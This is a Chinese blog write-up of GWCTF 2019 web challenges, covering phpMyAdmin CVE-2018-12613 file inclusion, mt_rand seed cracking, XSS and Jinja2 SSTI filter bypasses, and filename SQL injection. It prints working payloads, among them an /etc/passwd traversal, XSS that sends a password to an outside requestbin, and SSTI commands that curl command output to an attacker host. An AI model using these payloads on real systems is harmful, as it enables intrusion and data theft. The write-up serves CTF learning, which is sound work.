---
title: GWCTF2019 web wp
date: 2020-11-15 09:04:08
tags: CTF WEB
categories: CTF做题记录
---

<!-- TOC -->

- [[GWCTF 2019]我有一个数据库](#gwctf-2019我有一个数据库)
- [[GWCTF 2019]枯燥的抽奖](#gwctf-2019枯燥的抽奖)
- [[GWCTF 2019]mypassword](#gwctf-2019mypassword)
- [[GWCTF 2019]你的名字](#gwctf-2019你的名字)
- [[GWCTF 2019]blog](#gwctf-2019blog)

<!-- /TOC -->

<!--more-->
# [GWCTF 2019]我有一个数据库
遍扫描遍看wp，看到大佬直接盲猜`/phpmyadmin`我也就不扫了哈哈哈，记下来\
看一下版本，phpMyadmin 版本信息： 4.8.1，最新稳定版本： 4.9.7，既然版本更新了，那说明老版本很可能有漏洞鸭，Google一波\
phpmyadmin 4.8.1 远程文件包含漏洞（[CVE-2018-12613](https://www.exploit-db.com/exploits/44928)），payload：`?target=db_datadict.php%253f/../../../../../../../../etc/passwd`，直接一把梭了\
### [漏洞原理](https://blog.csdn.net/loseheart157/article/details/109345635)
跟着大佬的博客复现了一遍，先看phpMyAdmin 4.8.1版本的index.php文件的第50-63行代码
```php
$target_blacklist = array (
    'import.php', 'export.php'
);

// If we have a valid target, let's load that script instead
if (! empty($_REQUEST['target'])//target不能为空
    && is_string($_REQUEST['target'])//必须为字符串
    && ! preg_match('/^index/', $_REQUEST['target'])//开头不能为index
    && ! in_array($_REQUEST['target'], $target_blacklist)//不能存在黑名单的内容
    && Core::checkPageValidity($_REQUEST['target'])//经过checkPageValidity()检查
) {
    include $_REQUEST['target'];
    exit;
}

```
再看看`checkPageValidity()`
```php
public static function checkPageValidity(&$page, array $whitelist = [])//target与两个形参
{
    if (empty($whitelist)) {//检查其是否为空
        $whitelist = self::$goto_whitelist;//为空则用self::$goto_whitelist为其赋值
    }
    if (! isset($page) || !is_string($page)) {//判断target
        return false;
    }

    if (in_array($page, $whitelist)) {//检查是否在白名单
        return true;
    }

    $_page = mb_substr(//获取部分字符串
        $page,
        0,
        mb_strpos($page . '?', '?')//查找字符串在另一个字符串中首次出现的位置
    );
    if (in_array($_page, $whitelist)) {//截取后的target是否还存在白名单中
        return true;
    }

    $_page = urldecode($page);//url解码
    $_page = mb_substr(
        $_page,
        0,
        mb_strpos($_page . '?', '?')
    );//继续截取？前的字符串
    if (in_array($_page, $whitelist)) {//再次检查
        return true;
    }

    return false;
}
```
看一下`self::$goto_whitelist`白名单的内容
```php
public static $goto_whitelist = array(
        'db_datadict.php',
        'db_sql.php',
        'db_events.php',
        'db_export.php',
        'db_importdocsql.php',
        'db_multi_table_query.php',
        'db_structure.php',
        'db_import.php',
        'db_operations.php',
        'db_search.php',
        'db_routines.php',
        'export.php',
        'import.php',
        'index.php',
        'pdf_pages.php',
        'pdf_schema.php',
        'server_binlog.php',
        'server_collations.php',
        'server_databases.php',
        'server_engines.php',
        'server_export.php',
        'server_import.php',
        'server_privileges.php',
        'server_sql.php',
        'server_status.php',
        'server_status_advisor.php',
        'server_status_monitor.php',
        'server_status_queries.php',
        'server_status_variables.php',
        'server_variables.php',
        'sql.php',
        'tbl_addfield.php',
        'tbl_change.php',
        'tbl_create.php',
        'tbl_import.php',
        'tbl_indexes.php',
        'tbl_sql.php',
        'tbl_export.php',
        'tbl_operations.php',
        'tbl_structure.php',
        'tbl_relation.php',
        'tbl_replace.php',
        'tbl_row_action.php',
        'tbl_select.php',
        'tbl_zoom_select.php',
        'transformation_overview.php',
        'transformation_wrapper.php',
        'user_password.php',
);
```
那么payload就好解释了，`?target=db_datadict.php%253f/../../../../../../../../flag`中的`%253f`解码一次后为`%3f`这是由php的`$_REQUEST['target']`解释的，绕过第一次白名单检测，然后再此url解码，白名单还是会返回true造成任意文件读取

# [GWCTF 2019]枯燥的抽奖
>这题和MRCTF2020的[Ezaudit](https://yq1ng.github.io/z_post/MRCTF2020-%E5%A5%97%E9%A4%90/#mrctf2020ezaudit)很像，都是考察了伪随机数运用\
官方wp：https://github.com/gwht/2019GWCTF/tree/master/wp/web/%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96

看js，跟踪到`check.php`，得到源码
```php
<?php
#这不是抽奖程序的源代码！不许看！
header("Content-Type: text/html;charset=utf-8");
session_start();
if(!isset($_SESSION['seed'])){
    $_SESSION['seed']=rand(0,999999999);
}

mt_srand($_SESSION['seed']);//mt_srand()为mt_rand分发种子，但是$_SESSION['seed']似乎不是随机的，所以可以根据种子序列爆破出种子
$str_long1 = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";
$str='';
$len1=20;
for ( $i = 0; $i < $len1; $i++ ){
    $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);
}
$str_show = substr($str, 0, 10);
echo "<p id='p1'>".$str_show."</p>";


if(isset($_POST['num'])){
    if($_POST['num']===$str){x
        echo "<p id=flag>抽奖，就是那么枯燥且无味，给你flag{xxxxxxxxx}</p>";
    }
    else{
        echo "<p id=flag>没抽中哦，再试试吧</p>";
    }
}
show_source("check.php");
```
爆破种子脚本[在此](http://www.openwall.com/php_mt_seed/)
先用脚本得到序列
```python
str1='abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'
str2='yTPhFFRT7B'
str3 = str1[::-1]
length = len(str2)
res=''
for i in range(len(str2)):  
    for j in range(len(str1)):
        if str2[i] == str1[j]:
            res+=str(j)+' '+str(j)+' '+'0'+' '+str(len(str1)-1)+' '
            break
print(res)
```
得到序列：`46 46 0 61 40 40 0 61 9 9 0 61 41 41 0 61 26 26 0 61 55 55 0 61 42 42 0 61 10 10 0 61 49 49 0 61 40 40 0 61`，丢到[php_mt_seed](https://www.openwall.com/php_mt_seed/php_mt_seed-4.0.tar.gz)跑一下
![php_mt_seed](https://raw.githubusercontent.com/yq1ng/blog/master/GWCTF%202019/image.png)
注意php版本，下面的脚本需要对应的php版本才能运行成功
```php
<?php
mt_srand(272865584);
$str_long1 = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";
$str='';
$len1=20;
for ( $i = 0; $i < $len1; $i++ ){
    $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);       
}
echo "<p id='p1'>".$str."</p>";
```
提交字符串，done

# [GWCTF 2019]mypassword
顺手看了看源码，在/js/login.js下发现
```javascript
if (document.cookie && document.cookie != '') {
	var cookies = document.cookie.split('; ');
	var cookie = {};
	for (var i = 0; i < cookies.length; i++) {
		var arr = cookies[i].split('=');
		var key = arr[0];
		cookie[key] = arr[1];
	}
	if(typeof(cookie['user']) != "undefined" && typeof(cookie['psw']) != "undefined"){
		document.getElementsByName("username")[0].value = cookie['user'];
		document.getElementsByName("password")[0].value = cookie['psw'];
	}
}
```
注册admin，失败，存在了，想用约束攻击，失败，随便注册了一个，登进去发现
![login](https://raw.githubusercontent.com/yq1ng/blog/master/GWCTF%202019/image.yltcaxpg3gh.png)
看来不是注入了，反馈页面怎么看都像xss，看了源码，给了waf
```php
if(is_array($feedback)){
    echo "<script>alert('反馈不合法');</script>";
    return false;
}
$blacklist = ['_','\'','&','\\','#','%','input','script','iframe','host','onload','onerror','srcdoc','location','svg','form','img','src','getElement','document','cookie'];
foreach ($blacklist as $val) {
    while(true){
        if(stripos($feedback,$val) !== false){
            $feedback = str_ireplace($val,"",$feedback);
        }else{
            break;
        }
    }
}
```
xss不太会，看了看[官方wp](https://github.com/gwht/2019GWCTF/tree/master/wp/web/mypassword)，说是读取cookie即可获取flag，一开始我也想外部读取，但是不会，看了wp也说被禁了，构造xss反弹到buu的平台
```
<incookieput type="text" name="username">
<incookieput type="password" name="password">
<scrcookieipt scookierc="./js/login.js"></scrcookieipt>
<scrcookieipt>
    var psw = docucookiement.getcookieElementsByName("password")[0].value;
    docucookiement.locacookietion="http://http.requestbin.buuoj.cn/1bl3jrs1?psw="+psw;
</scrcookieipt>
```

# [GWCTF 2019]你的名字
随便输一个，这个回显真的像ssti，抓包看响应头为python，这是真ssti了，但是输入`{{1-1}}`搞了一个PHP报错？？？把docker下载下来了，看了源码，其实是出题人故意混淆的，~~建议暴打~~ waf如下：
```python
blacklist = ['import','getattr','os','class','subclasses','mro','request','args','eval','if','for',' subprocess','file','open','popen','builtins','compile','execfile','from_pyfile','local','self','item','getitem','getattribute','func_globals','config']
for no in blacklist:
    while True:
        if no in s:
            s =s.replace(no,'')
        else:
            break
```
这种过滤，一般都是对最后一个下手，例如if：iconfigf；黑名单的替换是按关键字的顺序来的，当config替换以后也就认为过滤结束了。~~这题不给源码怎么写。。出题人真的坏~~\
>[模板设计器](https://jinja.palletsprojects.com/en/master/templates)\
`{% ... %}` 控制结构清单\
`{{ ... }}` 模板输出的表达式\
`{# ... #}` 注释\
`# ... ##` 行语句

由于过滤了`{{}}`，结果不能直接显示，不过可以选择打到vps上\
payload：``{% iconfigf ''.__claconfigss__.__mrconfigo__[2].__subclaconfigsses__()[59].__init__.func_gloconfigbals.linecconfigache.oconfigs.popconfigen('curl http://ip:port/ -d `ls /|base64`') %}1{% endiconfigf %}``\
由于curl只能带出来一行，用base64可以编码一下，全部带出来\
flag：``{% iconfigf ''.__claconfigss__.__mrconfigo__[2].__subclaconfigsses__()[59].__init__.func_gloconfigbals.linecconfigache.oconfigs.popconfigen('curl http://ip:port/ -d `cat /flag_1s_Hera`') %}1{% endiconfigf %}``

# [GWCTF 2019]blog
登陆界面，sql注入没反应，注册admin已经存在，随便注册进去看URL感觉可以LFI，但是试了试发现只有admin才能读。接着是上传文件，可以上传一句话，但是不知道路径，没办法。上传文件后下面会显示文件名及上传日期，这个很像文件名注入，以前读文章见大佬博客提到过，但是没实践过，先fuzz，文件名：`select whereorandfrom.jpg`，这样fuzz，发现过滤不少，也能用burp爆破fuzz都行，简单过滤，双写就能绕过，先试试数据库名：`'+(selselectect(hex(database())))+'.jpg`，可以，转码为：bytectf

原理可参考[这篇博客](https://lethe.site/2019/05/21/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/#upload%EF%BC%88RCTF-2015%EF%BC%89)\
猜测sql为`insert into 表名('filename',...) values('你上传的文件名',...);`\
构造上述文件名后拼接sql得：`...values('文件名'+(selselectect conv(substr(hex(database()),1,12),16,10))+'.jpg',...);`

爆表，本来想用hex直接全爆出来，但是似乎不行，可能长度有限制，还是参考了[大佬博客](https://blog.csdn.net/qq_42181428/article/details/104402654)，依次移动即可全部读出来：`'+(selselectect(conv(hex(substr((selselectect(grogroupup_conconcatcat(table_name))frfromom(information_schema.tables)whewherere(table_schema='bytectf')),1,5)),16,10)))+'`，最后表名为：byte_user\
字段名类似，改改上面的table_name就行，不再赘述\
查管理员密码：`'+(selselectect(conv(hex(substr((selselectect(grogroupup_conconcatcat(password))frfromom(byte_user)whewherere(username='admin')),1,5)),16,10)))+'`\
拼接得到：`3814d79033f6fc9c1d3cf002a1f92100`\
试了一下，不是密码，应该是md5，解密得：`kotori912`

登陆admin，尝试读取index源码被抓了，hint：You can try to read picture file.

上传jpg提示`illegal ip`，看看network，发现cookie里面的plain可以base64解密，解密为`{"is_admin":true,"ip":false}`，encrypt提示cbc，应该就是cbc字节翻转攻击了，也是以前见过博客介绍，但是没深入研究，通过本题研究一下cbc翻转。。。研究失败，脚本不能用，这题暂时搁置